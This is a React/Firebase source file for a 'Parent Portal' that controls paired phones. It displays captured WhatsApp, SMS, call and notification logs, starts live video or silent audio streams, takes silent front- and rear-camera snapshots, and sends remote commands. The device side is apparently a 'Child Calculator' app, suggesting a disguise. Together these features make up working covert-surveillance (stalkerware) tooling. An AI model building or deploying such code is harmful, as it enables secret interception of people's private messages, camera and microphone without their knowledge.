"use client";

import React, { useState, useEffect, useRef } from "react";
import {
  signInWithEmailAndPassword,
  signOut,
  onAuthStateChanged,
  User as FirebaseUser,
} from "firebase/auth";
import { ref, onValue, set, push, off, update } from "firebase/database";
import { doc, setDoc } from "firebase/firestore";
import { auth, rtdb, firestore } from "@/lib/firebase";
import { WebRtcReceiver } from "@/lib/webrtc";
import {
  Video,
  Camera,
  RefreshCw,
  Phone,
  MessageSquare,
  Bell,
  Smartphone,
  Shield,
  Volume2,
  Flashlight,
  LogOut,
  Download,
  AlertTriangle,
  Play,
  Pause,
  Plus,
  Battery,
  Wifi,
  Trash2,
} from "lucide-react";

interface ChildUser {
  uid: string;
  email?: string;
  role?: string;
  parentId?: string;
  isOnline?: boolean;
  batteryLevel?: number;
  isCharging?: boolean;
  networkType?: string;
  lastSeen?: number;
}

export default function ParentApp() {
  const [user, setUser] = useState<FirebaseUser | null>(null);
  const [loading, setLoading] = useState(true);

  // Auth Inputs
  const [emailInput, setEmailInput] = useState("");
  const [passwordInput, setPasswordInput] = useState("");
  const [authError, setAuthError] = useState<string | null>(null);
  const [isAuthLoading, setIsAuthLoading] = useState(false);

  // Children State
  const [children, setChildren] = useState<ChildUser[]>([]);
  const [activeChildId, setActiveChildId] = useState<string>("");

  // Navigation Tabs: "live" | "activity" | "controls" | "pairing"
  const [activeTab, setActiveTab] = useState<"live" | "activity" | "controls" | "pairing">("live");

  // Activity Sub-Tabs: "whatsapp" | "calls" | "sms" | "notifications"
  const [activityTab, setActivityTab] = useState<"whatsapp" | "calls" | "sms" | "notifications">("whatsapp");

  // Live Stream State
  const [isStreaming, setIsStreaming] = useState(false);
  const [streamType, setStreamType] = useState<"video" | "audio">("video");
  const [cameraFacing, setCameraFacing] = useState<"front" | "back">("back");
  const [streamStatusText, setStreamStatusText] = useState("Idle");
  const videoRef = useRef<HTMLVideoElement>(null);
  const rtcReceiverRef = useRef<WebRtcReceiver | null>(null);

  // Activity Data
  const [whatsappLogs, setWhatsappLogs] = useState<any[]>([]);
  const [callLogs, setCallLogs] = useState<any[]>([]);
  const [smsLogs, setSmsLogs] = useState<any[]>([]);
  const [notifications, setNotifications] = useState<any[]>([]);

  // Pairing Code Modal
  const [generatedPairingCode, setGeneratedPairingCode] = useState<string>("");

  // PWA Install Prompt
  const [deferredPrompt, setDeferredPrompt] = useState<any>(null);
  const [canInstallPwa, setCanInstallPwa] = useState(false);

  // 1. Listen to Auth State
  useEffect(() => {
    const unsub = onAuthStateChanged(auth, (currentUser) => {
      setUser(currentUser);
      setLoading(false);
    });

    window.addEventListener("beforeinstallprompt", (e: any) => {
      e.preventDefault();
      setDeferredPrompt(e);
      setCanInstallPwa(true);
    });

    return () => unsub();
  }, []);

  // 2. Fetch Children Linked to this Parent
  useEffect(() => {
    if (!user) {
      setChildren([]);
      setActiveChildId("");
      return;
    }

    const usersRef = ref(rtdb, "users");
    const unsub = onValue(usersRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) {
        setChildren([]);
        return;
      }

      const list: ChildUser[] = [];
      Object.keys(data).forEach((uid) => {
        const item = data[uid];
        if (item.parentId === user.uid) {
          list.push({ uid, ...item });
        }
      });

      setChildren(list);
      if (list.length > 0 && !activeChildId) {
        setActiveChildId(list[0].uid);
      }
    });

    return () => off(usersRef, "value", unsub);
  }, [user, activeChildId]);

  // 3. Listen to Active Child's Activity Logs
  useEffect(() => {
    if (!activeChildId) return;

    // WhatsApp Logs
    const waRef = ref(rtdb, `whatsapp_logs/${activeChildId}`);
    const unsubWa = onValue(waRef, (snap) => {
      const val = snap.val();
      if (val) {
        const arr = Object.values(val).reverse();
        setWhatsappLogs(arr);
      } else setWhatsappLogs([]);
    });

    // Call Logs
    const callRef = ref(rtdb, `call_logs/${activeChildId}`);
    const unsubCall = onValue(callRef, (snap) => {
      const val = snap.val();
      if (val) {
        const arr = (val.logs || Object.values(val)).reverse();
        setCallLogs(arr);
      } else setCallLogs([]);
    });

    // SMS Logs
    const smsRef = ref(rtdb, `sms_logs/${activeChildId}`);
    const unsubSms = onValue(smsRef, (snap) => {
      const val = snap.val();
      if (val) {
        const arr = (val.logs || Object.values(val)).reverse();
        setSmsLogs(arr);
      } else setSmsLogs([]);
    });

    // Notifications
    const notifRef = ref(rtdb, `notifications/${activeChildId}`);
    const unsubNotif = onValue(notifRef, (snap) => {
      const val = snap.val();
      if (val) {
        const arr = (val.notifications || Object.values(val)).reverse();
        setNotifications(arr);
      } else setNotifications([]);
    });

    return () => {
      off(waRef, "value", unsubWa);
      off(callRef, "value", unsubCall);
      off(smsRef, "value", unsubSms);
      off(notifRef, "value", unsubNotif);
    };
  }, [activeChildId]);

  // 4. Handle PWA Installation
  const handleInstallPwa = async () => {
    if (!deferredPrompt) return;
    deferredPrompt.prompt();
    const { outcome } = await deferredPrompt.userChoice;
    if (outcome === "accepted") {
      setCanInstallPwa(false);
    }
  };

  // 5. Auth Handlers
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setAuthError(null);
    setIsAuthLoading(true);
    try {
      await signInWithEmailAndPassword(auth, emailInput.trim(), passwordInput);
    } catch (err: any) {
      setAuthError(err.message || "Failed to sign in. Check email and password.");
    } finally {
      setIsAuthLoading(false);
    }
  };

  const handleLogout = async () => {
    stopStream();
    await signOut(auth);
  };

  // 6. Live Stream Handlers
  const startStream = async () => {
    if (!activeChildId) return;
    setIsStreaming(true);
    setStreamStatusText("Connecting to child device...");

    rtcReceiverRef.current = new WebRtcReceiver(
      (remoteStream) => {
        if (videoRef.current) {
          videoRef.current.srcObject = remoteStream;
          setStreamStatusText("Live 60fps connected");
        }
      },
      (state) => {
        setStreamStatusText(`Peer State: ${state}`);
        if (state === "failed" || state === "closed") {
          setIsStreaming(false);
        }
      },
      (err) => {
        setStreamStatusText("Error: " + err);
        setIsStreaming(false);
      }
    );

    try {
      await rtcReceiverRef.current.startReceiver(activeChildId, streamType);
    } catch (e: any) {
      setStreamStatusText("Connection Failed");
      setIsStreaming(false);
    }
  };

  const stopStream = () => {
    if (rtcReceiverRef.current) {
      rtcReceiverRef.current.stop();
      rtcReceiverRef.current = null;
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
    setIsStreaming(false);
    setStreamStatusText("Idle");
  };

  const toggleCamera = async () => {
    const nextFacing = cameraFacing === "front" ? "back" : "front";
    setCameraFacing(nextFacing);
    if (rtcReceiverRef.current) {
      await rtcReceiverRef.current.switchCamera(nextFacing);
    }
  };

  // 7. Remote Command Triggers (Matches Android /commands/{childId}/{cmd})
  const sendCommand = async (command: string, value: any = true) => {
    if (!activeChildId) return;
    const requestId = "req_" + Date.now() + "_" + Math.random().toString(36).substring(2, 7);
    await set(ref(rtdb, `commands/${activeChildId}/${command}`), {
      requestId: requestId,
      command: command,
      value: value,
      timestamp: Date.now(),
    });
    alert(`Command '${command}' (${value ? "ON" : "OFF"}) sent to device.`);
  };

  // Snapshot Trigger (Matches Android /streams/{childId}/snapshotRequest)
  const handleRequestSnapshot = async (facing: "front" | "back" = "back") => {
    if (!activeChildId) return;
    const reqRef = ref(rtdb, `streams/${activeChildId}/snapshotRequest`);
    await set(reqRef, {
      requestId: "snap_" + Date.now(),
      requestedAt: Date.now(),
      cameraFacing: facing,
      status: "REQUESTED",
    });
    alert(`Snapshot requested from ${facing} camera.`);
  };

  // 8. Generate 6-Digit Pairing Code
  const handleGeneratePairingCode = async () => {
    if (!user) return;
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    setGeneratedPairingCode(code);
    await set(ref(rtdb, `pairing_codes/${code}`), {
      parentUid: user.uid,
      parentEmail: user.email || "",
      createdAt: Date.now(),
      status: "active",
    });
  };

  // 9. Unpair Child Device
  const handleUnpairChild = async (childUid: string) => {
    if (
      !window.confirm(
        "Are you sure you want to unpair this child device? Real-time telemetry, remote controls, and streaming access will be disconnected."
      )
    ) {
      return;
    }
    try {
      const updates: Record<string, any> = {};
      updates[`users/${childUid}/parentId`] = null;
      updates[`streams/${childUid}`] = null;
      await update(ref(rtdb), updates);

      try {
        await setDoc(doc(firestore, "users", childUid), { parentId: "" }, { merge: true });
      } catch (e) {
        console.warn("Firestore unpair sync error:", e);
      }

      setChildren((prev) => prev.filter((c) => c.uid !== childUid));
      if (activeChildId === childUid) {
        setActiveChildId("");
      }
      alert("Child device unpaired successfully.");
    } catch (err: any) {
      alert("Failed to unpair child: " + (err.message || err));
    }
  };

  const activeChild = children.find((c) => c.uid === activeChildId);

  // Render Loading
  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-[#121216]">
        <div className="animate-spin rounded-full h-10 w-10 border-t-2 border-b-2 border-blue-500"></div>
      </div>
    );
  }

  // Render Login Screen if Not Authenticated
  if (!user) {
    return (
      <main className="flex flex-col items-center justify-center min-h-screen p-4 bg-[#121216]">
        <div className="w-full max-w-md p-8 bg-[#1B1B22] border border-[#2D2D38] rounded-2xl shadow-2xl">
          <div className="flex flex-col items-center mb-6">
            <div className="p-3 bg-blue-600/20 text-blue-400 rounded-full mb-3">
              <Shield className="w-9 h-9" />
            </div>
            <h1 className="text-2xl font-bold text-white tracking-wide">Parent Portal</h1>
            <p className="text-xs text-gray-400 mt-1">Sign in to monitor linked child devices</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-xs font-medium text-gray-300 mb-1">Parent Email</label>
              <input
                type="email"
                required
                value={emailInput}
                onChange={(e) => setEmailInput(e.target.value)}
                placeholder="parent@example.com"
                className="w-full px-4 py-3 bg-[#141418] border border-[#333340] rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 text-sm"
              />
            </div>

            <div>
              <label className="block text-xs font-medium text-gray-300 mb-1">Password</label>
              <input
                type="password"
                required
                value={passwordInput}
                onChange={(e) => setPasswordInput(e.target.value)}
                placeholder="••••••••"
                className="w-full px-4 py-3 bg-[#141418] border border-[#333340] rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 text-sm"
              />
            </div>

            {authError && (
              <div className="p-3 bg-red-950/40 border border-red-800/60 rounded-xl flex items-center gap-2 text-xs text-red-300">
                <AlertTriangle className="w-4 h-4 shrink-0 text-red-400" />
                <span>{authError}</span>
              </div>
            )}

            <button
              type="submit"
              disabled={isAuthLoading}
              className="w-full py-3.5 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl transition duration-200 shadow-lg shadow-blue-600/30 text-sm flex items-center justify-center gap-2"
            >
              {isAuthLoading ? (
                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
              ) : (
                "Sign In"
              )}
            </button>
          </form>

          {canInstallPwa && (
            <div className="mt-6 pt-4 border-t border-[#2B2B36] text-center">
              <button
                onClick={handleInstallPwa}
                className="inline-flex items-center gap-2 text-xs text-blue-400 hover:text-blue-300 font-medium"
              >
                <Download className="w-3.5 h-3.5" />
                Install Parent App on Phone
              </button>
            </div>
          )}
        </div>
      </main>
    );
  }

  // Authenticated Dashboard Layout
  return (
    <div className="flex flex-col min-h-screen bg-[#121216] text-gray-100 max-w-5xl mx-auto pb-20 md:pb-6">
      {/* Top Header */}
      <header className="sticky top-0 z-30 flex items-center justify-between px-4 py-3 bg-[#1B1B22]/90 backdrop-blur-md border-b border-[#2D2D38]">
        <div className="flex items-center gap-2.5">
          <div className="p-2 bg-blue-600/20 text-blue-400 rounded-lg">
            <Shield className="w-5 h-5" />
          </div>
          <div>
            <h1 className="text-sm font-bold text-white tracking-wide">Parent Portal</h1>
            <p className="text-[10px] text-gray-400 truncate max-w-[150px] sm:max-w-xs">{user.email}</p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          {canInstallPwa && (
            <button
              onClick={handleInstallPwa}
              className="flex items-center gap-1.5 px-3 py-1.5 bg-blue-600/20 hover:bg-blue-600/30 text-blue-400 text-xs font-semibold rounded-lg transition"
            >
              <Download className="w-3.5 h-3.5" />
              <span className="hidden sm:inline">Install</span>
            </button>
          )}

          <button
            onClick={handleLogout}
            title="Sign Out"
            className="p-2 bg-[#25252E] hover:bg-[#2F2F3B] text-gray-300 rounded-lg transition"
          >
            <LogOut className="w-4 h-4" />
          </button>
        </div>
      </header>

      {/* Child Device Selector Bar */}
      <div className="px-4 py-3 bg-[#17171E] border-b border-[#252530] flex items-center justify-between overflow-x-auto gap-3">
        <div className="flex items-center gap-2">
          {children.length === 0 ? (
            <span className="text-xs text-yellow-400 flex items-center gap-1.5">
              <AlertTriangle className="w-4 h-4" /> No children linked yet
            </span>
          ) : (
            children.map((child) => (
              <button
                key={child.uid}
                onClick={() => setActiveChildId(child.uid)}
                className={`flex items-center gap-2 px-3.5 py-1.5 rounded-xl text-xs font-medium transition ${
                  activeChildId === child.uid
                    ? "bg-blue-600 text-white shadow-md shadow-blue-600/20"
                    : "bg-[#22222B] text-gray-300 hover:bg-[#2A2A36]"
                }`}
              >
                <span
                  className={`w-2 h-2 rounded-full ${
                    child.isOnline ? "bg-green-400 animate-pulse" : "bg-gray-500"
                  }`}
                />
                <span className="truncate max-w-[110px]">{child.email || "Child Device"}</span>
              </button>
            ))
          )}
        </div>

        <button
          onClick={() => {
            setActiveTab("pairing");
            handleGeneratePairingCode();
          }}
          className="flex items-center gap-1.5 px-3 py-1.5 bg-[#252530] hover:bg-[#30303E] text-xs font-semibold text-blue-400 rounded-xl transition shrink-0"
        >
          <Plus className="w-3.5 h-3.5" />
          <span>Add Child</span>
        </button>
      </div>

      {/* Active Device Status Ribbon */}
      {activeChild && (
        <div className="px-4 py-2 bg-[#14141A] border-b border-[#202028] flex items-center justify-between text-[11px] text-gray-400">
          <div className="flex items-center gap-4">
            <span className="flex items-center gap-1">
              <span className={`w-2 h-2 rounded-full ${activeChild.isOnline ? "bg-green-400" : "bg-gray-500"}`} />
              {activeChild.isOnline ? "Online" : "Offline"}
            </span>

            {activeChild.batteryLevel !== undefined && (
              <span className="flex items-center gap-1">
                <Battery className="w-3.5 h-3.5 text-gray-300" />
                {activeChild.batteryLevel}% {activeChild.isCharging ? "⚡" : ""}
              </span>
            )}

            {activeChild.networkType && (
              <span className="flex items-center gap-1">
                <Wifi className="w-3.5 h-3.5 text-gray-300" />
                {activeChild.networkType}
              </span>
            )}
          </div>

          <div className="flex items-center gap-2">
            <span className="truncate max-w-[140px] text-gray-500 hidden sm:inline">UID: {activeChild.uid.slice(0, 8)}...</span>
            <button
              onClick={() => handleUnpairChild(activeChild.uid)}
              className="flex items-center gap-1 px-2 py-1 text-[11px] font-medium bg-red-950/40 hover:bg-red-900/60 text-red-400 border border-red-800/40 rounded-lg transition"
              title="Unpair Device"
            >
              <Trash2 className="w-3 h-3" />
              <span>Unpair</span>
            </button>
          </div>
        </div>
      )}

      {/* Main Content Body */}
      <main className="flex-1 p-4">
        {/* Tab 1: Live Stream Player */}
        {activeTab === "live" && (
          <div className="flex flex-col gap-4">
            {/* Video Player Box */}
            <div className="relative w-full aspect-video bg-black rounded-2xl overflow-hidden border border-[#2B2B36] flex items-center justify-center shadow-xl">
              <video
                ref={videoRef}
                autoPlay
                playsInline
                className={`w-full h-full object-contain ${isStreaming ? "block" : "hidden"}`}
              />

              {!isStreaming && (
                <div className="flex flex-col items-center gap-3 text-gray-500">
                  <div className="p-4 bg-[#1E1E26] rounded-full">
                    <Video className="w-8 h-8 text-gray-400" />
                  </div>
                  <p className="text-xs font-medium text-gray-400">Live stream stopped</p>
                </div>
              )}

              {/* Status Pill in Corner */}
              <div className="absolute top-3 left-3 px-2.5 py-1 bg-black/60 backdrop-blur-md rounded-md text-[10px] font-semibold text-gray-200 flex items-center gap-1.5 border border-white/10">
                <span
                  className={`w-1.5 h-1.5 rounded-full ${
                    isStreaming ? "bg-red-500 animate-ping" : "bg-gray-400"
                  }`}
                />
                {streamStatusText}
              </div>
            </div>

            {/* Stream Controls */}
            <div className="p-4 bg-[#1B1B22] border border-[#2B2B36] rounded-2xl flex flex-wrap items-center justify-between gap-3">
              <div className="flex items-center gap-2">
                <button
                  onClick={() => setStreamType("video")}
                  className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition ${
                    streamType === "video" ? "bg-blue-600 text-white" : "bg-[#252530] text-gray-300"
                  }`}
                >
                  Video + Audio
                </button>
                <button
                  onClick={() => setStreamType("audio")}
                  className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition ${
                    streamType === "audio" ? "bg-blue-600 text-white" : "bg-[#252530] text-gray-300"
                  }`}
                >
                  Audio Only (Silent)
                </button>
              </div>

              <div className="flex items-center gap-2">
                {isStreaming && (
                  <button
                    onClick={toggleCamera}
                    className="p-2.5 bg-[#252530] hover:bg-[#30303E] text-gray-200 rounded-xl text-xs font-medium transition flex items-center gap-1.5"
                    title="Switch Camera"
                  >
                    <Camera className="w-4 h-4" />
                    <span className="hidden sm:inline capitalize">{cameraFacing}</span>
                  </button>
                )}

                {!isStreaming ? (
                  <button
                    onClick={startStream}
                    disabled={!activeChildId}
                    className="px-5 py-2.5 bg-blue-600 hover:bg-blue-500 disabled:opacity-50 text-white text-xs font-bold rounded-xl transition shadow-lg shadow-blue-600/30 flex items-center gap-2"
                  >
                    <Play className="w-4 h-4 fill-white" />
                    Start Live Stream
                  </button>
                ) : (
                  <button
                    onClick={stopStream}
                    className="px-5 py-2.5 bg-red-600 hover:bg-red-500 text-white text-xs font-bold rounded-xl transition shadow-lg shadow-red-600/30 flex items-center gap-2"
                  >
                    <Pause className="w-4 h-4 fill-white" />
                    Stop Stream
                  </button>
                )}
              </div>
            </div>
          </div>
        )}

        {/* Tab 2: Activity Logs */}
        {activeTab === "activity" && (
          <div className="flex flex-col gap-3">
            {/* Activity Sub-Navigation */}
            <div className="flex items-center gap-2 overflow-x-auto pb-1">
              {[
                { id: "whatsapp", label: "WhatsApp", icon: MessageSquare, count: whatsappLogs.length },
                { id: "calls", label: "Calls", icon: Phone, count: callLogs.length },
                { id: "sms", label: "SMS", icon: MessageSquare, count: smsLogs.length },
                { id: "notifications", label: "Notifs", icon: Bell, count: notifications.length },
              ].map((tab) => {
                const IconComp = tab.icon;
                return (
                  <button
                    key={tab.id}
                    onClick={() => setActivityTab(tab.id as any)}
                    className={`flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs font-medium shrink-0 transition ${
                      activityTab === tab.id
                        ? "bg-blue-600 text-white shadow-md shadow-blue-600/20"
                        : "bg-[#1E1E26] text-gray-400 hover:bg-[#252530]"
                    }`}
                  >
                    <IconComp className="w-3.5 h-3.5" />
                    <span>{tab.label}</span>
                    <span className="text-[10px] px-1.5 py-0.5 bg-black/30 rounded-full font-bold">
                      {tab.count}
                    </span>
                  </button>
                );
              })}
            </div>

            {/* Sub-Tab Content: WhatsApp */}
            {activityTab === "whatsapp" && (
              <div className="space-y-2 mt-2">
                {whatsappLogs.length === 0 ? (
                  <p className="text-center py-10 text-xs text-gray-500">No WhatsApp messages captured yet.</p>
                ) : (
                  whatsappLogs.map((item, idx) => (
                    <div
                      key={idx}
                      className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-1 text-xs"
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-green-400">{item.senderName || item.sender || "Unknown"}</span>
                        <span className="text-[10px] text-gray-500">
                          {item.timestamp ? new Date(item.timestamp).toLocaleTimeString() : ""}
                        </span>
                      </div>
                      <p className="text-gray-300 font-normal">{item.messageText || item.text || item.message}</p>
                      {item.type && (
                        <span className="text-[9px] text-gray-500 uppercase tracking-wider font-semibold">
                          Type: {item.type}
                        </span>
                      )}
                    </div>
                  ))
                )}
              </div>
            )}

            {/* Sub-Tab Content: Calls */}
            {activityTab === "calls" && (
              <div className="space-y-2 mt-2">
                {callLogs.length === 0 ? (
                  <p className="text-center py-10 text-xs text-gray-500">No call history available.</p>
                ) : (
                  callLogs.map((call, idx) => (
                    <div
                      key={idx}
                      className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex items-center justify-between text-xs"
                    >
                      <div>
                        <p className="font-bold text-white">{call.number || call.phoneNumber || "Unknown Number"}</p>
                        <p className="text-[10px] text-gray-400">
                          {call.callType || "Call"} • Duration: {call.duration || 0}s
                        </p>
                      </div>
                      <span className="text-[10px] text-gray-500">
                        {call.timestamp ? new Date(call.timestamp).toLocaleDateString() : ""}
                      </span>
                    </div>
                  ))
                )}
              </div>
            )}

            {/* Sub-Tab Content: SMS */}
            {activityTab === "sms" && (
              <div className="space-y-2 mt-2">
                {smsLogs.length === 0 ? (
                  <p className="text-center py-10 text-xs text-gray-500">No SMS logs captured.</p>
                ) : (
                  smsLogs.map((sms, idx) => (
                    <div
                      key={idx}
                      className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-1 text-xs"
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-blue-400">{sms.address || sms.sender}</span>
                        <span className="text-[10px] text-gray-500">
                          {sms.date ? new Date(sms.date).toLocaleTimeString() : ""}
                        </span>
                      </div>
                      <p className="text-gray-300">{sms.body || sms.message}</p>
                    </div>
                  ))
                )}
              </div>
            )}

            {/* Sub-Tab Content: Notifications */}
            {activityTab === "notifications" && (
              <div className="space-y-2 mt-2">
                {notifications.length === 0 ? (
                  <p className="text-center py-10 text-xs text-gray-500">No app notifications captured.</p>
                ) : (
                  notifications.map((notif, idx) => (
                    <div
                      key={idx}
                      className="p-3 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-1 text-xs"
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-yellow-400">{notif.appName || notif.packageName}</span>
                        <span className="text-[10px] text-gray-500">
                          {notif.timestamp ? new Date(notif.timestamp).toLocaleTimeString() : ""}
                        </span>
                      </div>
                      <p className="text-white font-medium">{notif.title}</p>
                      <p className="text-gray-400 text-[11px]">{notif.text}</p>
                    </div>
                  ))
                )}
              </div>
            )}
          </div>
        )}

        {/* Tab 3: Emergency Remote Controls */}
        {activeTab === "controls" && (
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <button
              onClick={() => sendCommand("SIREN", true)}
              className="p-4 bg-[#1B1B22] border border-[#2B2B36] hover:border-red-500/50 rounded-2xl flex items-center gap-3 text-left transition group"
            >
              <div className="p-3 bg-red-600/20 text-red-400 rounded-xl group-hover:scale-105 transition">
                <Volume2 className="w-5 h-5" />
              </div>
              <div>
                <h3 className="text-xs font-bold text-white">Play Emergency Siren</h3>
                <p className="text-[10px] text-gray-400">Plays high-volume alert sound on child phone</p>
              </div>
            </button>

            <button
              onClick={() => sendCommand("SIREN", false)}
              className="p-4 bg-[#1B1B22] border border-[#2B2B36] hover:border-gray-500/50 rounded-2xl flex items-center gap-3 text-left transition group"
            >
              <div className="p-3 bg-gray-600/20 text-gray-300 rounded-xl group-hover:scale-105 transition">
                <Volume2 className="w-5 h-5" />
              </div>
              <div>
                <h3 className="text-xs font-bold text-white">Stop Siren</h3>
                <p className="text-[10px] text-gray-400">Silences active emergency alarm</p>
              </div>
            </button>

            <button
              onClick={() => sendCommand("TORCH", true)}
              className="p-4 bg-[#1B1B22] border border-[#2B2B36] hover:border-yellow-500/50 rounded-2xl flex items-center gap-3 text-left transition group"
            >
              <div className="p-3 bg-yellow-600/20 text-yellow-400 rounded-xl group-hover:scale-105 transition">
                <Flashlight className="w-5 h-5" />
              </div>
              <div>
                <h3 className="text-xs font-bold text-white">Turn Flashlight ON</h3>
                <p className="text-[10px] text-gray-400">Enables camera torch remotely</p>
              </div>
            </button>

            <button
              onClick={() => sendCommand("TORCH", false)}
              className="p-4 bg-[#1B1B22] border border-[#2B2B36] hover:border-gray-500/50 rounded-2xl flex items-center gap-3 text-left transition group"
            >
              <div className="p-3 bg-gray-600/20 text-gray-300 rounded-xl group-hover:scale-105 transition">
                <Flashlight className="w-5 h-5" />
              </div>
              <div>
                <h3 className="text-xs font-bold text-white">Turn Flashlight OFF</h3>
                <p className="text-[10px] text-gray-400">Disables camera torch remotely</p>
              </div>
            </button>

            <button
              onClick={() => handleRequestSnapshot("back")}
              className="p-4 bg-[#1B1B22] border border-[#2B2B36] hover:border-blue-500/50 rounded-2xl flex items-center gap-3 text-left transition group"
            >
              <div className="p-3 bg-blue-600/20 text-blue-400 rounded-xl group-hover:scale-105 transition">
                <Camera className="w-5 h-5" />
              </div>
              <div>
                <h3 className="text-xs font-bold text-white">Capture Rear Photo</h3>
                <p className="text-[10px] text-gray-400">Takes silent snapshot from back camera</p>
              </div>
            </button>

            <button
              onClick={() => handleRequestSnapshot("front")}
              className="p-4 bg-[#1B1B22] border border-[#2B2B36] hover:border-purple-500/50 rounded-2xl flex items-center gap-3 text-left transition group"
            >
              <div className="p-3 bg-purple-600/20 text-purple-400 rounded-xl group-hover:scale-105 transition">
                <Camera className="w-5 h-5" />
              </div>
              <div>
                <h3 className="text-xs font-bold text-white">Capture Front Photo</h3>
                <p className="text-[10px] text-gray-400">Takes silent selfie snapshot from front camera</p>
              </div>
            </button>
          </div>
        )}

        {/* Tab 4: Pairing Code Generator */}
        {activeTab === "pairing" && (
          <div className="p-6 bg-[#1B1B22] border border-[#2B2B36] rounded-2xl flex flex-col items-center text-center max-w-md mx-auto">
            <div className="p-3 bg-blue-600/20 text-blue-400 rounded-full mb-3">
              <Smartphone className="w-8 h-8" />
            </div>
            <h2 className="text-base font-bold text-white">Pair New Child Device</h2>
            <p className="text-xs text-gray-400 mt-1 mb-5">
              Enter this 6-digit code in the Child Calculator app to link this device.
            </p>

            {generatedPairingCode ? (
              <div className="py-4 px-8 bg-[#14141A] border border-[#333342] rounded-2xl mb-4">
                <span className="text-3xl font-mono font-bold tracking-widest text-blue-400">
                  {generatedPairingCode}
                </span>
              </div>
            ) : null}

            <button
              onClick={handleGeneratePairingCode}
              className="px-6 py-3 bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold rounded-xl transition shadow-lg shadow-blue-600/30 flex items-center gap-2"
            >
              <RefreshCw className="w-4 h-4" />
              Generate New Pairing Code
            </button>
          </div>
        )}
      </main>

      {/* Bottom Mobile-Style Navigation Bar */}
      <nav className="fixed bottom-0 left-0 right-0 z-30 max-w-5xl mx-auto bg-[#17171E]/95 backdrop-blur-md border-t border-[#262632] flex items-center justify-around py-2 px-3">
        {[
          { id: "live", label: "Live Cast", icon: Video },
          { id: "activity", label: "Activities", icon: MessageSquare },
          { id: "controls", label: "Controls", icon: Shield },
          { id: "pairing", label: "Pair Device", icon: Smartphone },
        ].map((tab) => {
          const IconComp = tab.icon;
          const isActive = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`flex flex-col items-center gap-1 py-1 px-3 rounded-xl transition ${
                isActive ? "text-blue-400 font-bold" : "text-gray-400 hover:text-gray-200"
              }`}
            >
              <IconComp className="w-5 h-5" />
              <span className="text-[10px]">{tab.label}</span>
            </button>
          );
        })}
      </nav>
    </div>
  );
}
